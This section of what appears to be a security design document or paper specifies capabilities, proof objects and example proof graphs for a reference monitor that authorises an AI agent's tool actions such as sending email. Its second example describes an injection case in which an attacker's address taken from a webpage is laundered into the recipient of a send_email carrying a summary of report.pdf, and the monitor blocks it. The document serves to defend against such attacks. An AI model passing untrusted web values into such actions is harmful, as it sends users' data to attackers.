# 04. Capability and Proof Model

## 4.1 Capability schema

A capability is an **opaque handle** plus a stored, MAC-protected record:

```text
Capability {
  cap_id:        UUID128            # opaque; the only thing exposed to the runtime
  issuer:        principal          # minting service instance
  root:          USER | POLICY | ENDORSEMENT | DELEGATION
  subject_agent: agent_id           # which agent may use it (agent binding)
  task_id:       task_id            # which task (task binding)
  action_kind:   read | transform | send | write | exec | net | endorse
  tool:          tool_name | "*"
  role:          recipient | file_path | command | external_endpoint | data | (none)
  predicate:     φ                  # e.g. recipient == canon("alice@example.com")
                                     #      file_path ∈ subtree("/workspace")
                                     #      endpoint.host ∈ {api.internal}
  linearity:     reusable | affine | linear
  max_uses:      int
  uses:          int
  expires_at:    timestamp | "task_end"
  delegable:     bool               # may this be attenuated to a child?
  transferable:  bool               # default false (esp. endorsement)
  persistent:    bool               # may this survive task end via memory? default false
  parent_cap:    cap_id | null      # for delegation chains
  nonce:         bytes              # per-reservation anti-replay
  status:        available | reserved | consumed | revoked | expired
  mac:           bytes              # MAC(record) under minting key
}
```

### Linearity policy by role/action

| Action / role | Default linearity | Rationale |
|---|---|---|
| `read_file` (file_path, read) | **reusable** | reading within scope is idempotent and low-impact |
| `summarize`/transform | **reusable** | pure derivation; tracked by receipts, not consumption |
| `send_email` (recipient) | **linear** (`max_uses=1` unless user grants more) | each external send is a distinct high-impact effect |
| `write_file` (file_path, write) | **affine** | a write may be intended once; affine prevents silent reuse |
| `run_shell` (command) | **linear** | each command execution is a distinct high-impact effect |
| external endpoint (net) | **linear** | each egress is a distinct high-impact effect |
| **endorsement** | **linear, `max_uses=1`, non-transferable, non-persistent** | a "yes" authorizes exactly one action |
| delegation child | **≤ parent** on every dimension | attenuation-only |

**Invariants enforced by minting + monitor:**
- Capabilities are opaque handles, never natural-language strings (defeats fake-proof/metadata minting).
- `root ∈ UNTRUSTED_ROOTS` is **never** mintable for an authority-bearing role (`NO-MINT-UNTRUSTED`).
- For delegation: every dimension of a child is `≤` the parent (`DELEGATE-ATTENUATE`).
- `transferable=false` and `persistent=false` by default; only an explicit, logged endorsement may set `persistent=true`.

## 4.2 Proof (witness) object schema

```text
Proof {
  proof_id:         UUID
  action_hash:      H(canonical_action)     # binds the witness to one exact action
  authspec_ref:     auth_id
  capability_uses:  [ {cap_id, role, reserved_nonce} ... ]
  arg_bindings:     [ {arg, canonical_value, cap_id} ... ]
  derivation_steps: [ {output_class, op, inputs, receipt_id} ... ]
  receipts:         [ receipt_id ... ]
  delegation_chain: [ delegation_cert_id ... ]   # optional
  endorsement_chain:[ endorsement_receipt_id ... ] # optional
  manifest_hash:    H(all of the above)
}
```

The proof is a **certificate**: it asserts *which* capabilities/receipts/certs justify the action. It is untrusted input to the monitor; the monitor re-validates each referenced object against the trusted stores.

## 4.3 Three proof DAGs

### (a) Benign send — ALLOW

`send_email(to=alice@example.com, body=summary(report.pdf))`

```text
[USER-MINT] Cap_read(file_path∈/workspace, reusable)
      │ read_file(report.pdf)  ──▶ value x  (root=USER via authorized read)
      ▼
[DERIVE-CONTENT] receipt: y = summarize(x), op∈SAFE  ──▶ y = summary(report.pdf)
      │
[USER-MINT] Cap_send(recipient==alice, data_class=summary(report.pdf), linear, max_uses=1)
      │  BIND-AUTH-ARG: recipient=canon("alice@example.com") matches φ
      ▼
[CONSUME] all authority-bearing args bound  ──▶  action authorized
      ▼  reserve → execute → commit → consume(Cap_send)
   ALLOW
```

### (b) Laundered send — DENY (NoCap)

`send_email(to=attacker@example.com, body=summary(report.pdf))` where `attacker@…` came from a webpage.

```text
recipient value v=attacker@example.com,  provenance.root = Webpage
      │  BIND-AUTH-ARG requires Cap with φ(v)=true
      ▼
no Cap_send has predicate recipient==attacker  (USER minted only recipient==alice)
   and NO-MINT-UNTRUSTED forbids minting one from Webpage
      ▼
   DENY  NoCap(role=recipient)   [or SourceMismatch if a forged binding is attempted]
```

### (c) Endorsed send to a new recipient — ALLOW after one-shot endorsement

User at runtime approves sending the summary to `bob@example.com` (not in original AuthSpec).

```text
agent proposes send_email(to=bob, body=summary(report.pdf))
      │  verify(): NoCap(role=recipient)  →  but action is endorsable
      ▼  guard() returns ASK(challenge showing canonical recipient=bob, data=summary)
[ENDORSE-ONCE] user approves  ──▶ Cap_endorse(recipient==bob, data_class=summary,
                                              root=ENDORSEMENT, linear, max_uses=1,
                                              task_id=task_42, action_hash=H(canon action))
      ▼
re-verify with Cap_endorse: BIND-AUTH-ARG matches, CONSUME ok
      ▼  reserve → execute → commit → consume(Cap_endorse)
   ALLOW   (a second identical send would DENY ConsumedCap)
```

## 4.4 Why carry a proof at all? (the honesty argument)

A reviewer will note that the monitor re-verifies everything, so why not just have the monitor do a capability-consumption check directly? Three reasons, plus an ablation that tests them:

1. **Synthesis is search; verification is checking.** Finding *which* capabilities and *which* derivation receipts justify a multi-step action (e.g., a value derived through several transforms, possibly via a delegation chain) is a search over the capability/receipt/derivation space. The proof records the witness so the monitor runs in time **linear in |π|** rather than searching. This matters precisely on the non-trivial cases (deep derivations, delegation chains), and is the standard proof-carrying rationale, restricted to a setting where it actually buys something.
2. **Auditability.** The proof is a portable, signed-evidence-referencing artifact attached to every high-impact action's receipt — a clean audit trail of *why* an action was authorized. This is a deployment asset independent of the latency argument.
3. **Cheap re-verification on replan.** When the agent replans, the monitor re-checks the affected prefix's proofs against current store state (consumed caps, revocations) without re-running synthesis (`Prefix Soundness`, §05).

**Honest caveat and the test for it.** On *shallow* actions (single authority-bearing argument, no derivation), the proof reduces to "here is the one cap id," and the monitor could find it itself; the proof adds little beyond auditability. We therefore run the `ProofObjectRemoved` ablation (§09): replace the carried witness with monitor-side synthesis and measure (i) verifier latency on deep vs. shallow actions and (ii) whether any security outcome changes (it should not). If the latency benefit is negligible across the benchmark, we will **demote "proof-carrying" from a headline to an implementation detail and rename the system around "capability-consuming reference monitor."** We commit to following the data here rather than defending the brand.
